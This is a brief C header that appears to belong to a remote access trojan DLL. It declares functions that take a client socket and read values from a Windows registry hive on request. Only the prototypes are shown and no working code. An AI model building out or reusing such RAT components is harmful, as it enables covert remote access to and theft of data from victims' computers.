#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include "RAT-Dll-Main.h"

INT handleRegRead(__in SOCKET clientSock);

INT performRegRead(__in char* keyPath, __in char* valueName, __out void** regValue, __out DWORD* sizeRegValue);

HKEY getHiveKey(__in char* hiveKey);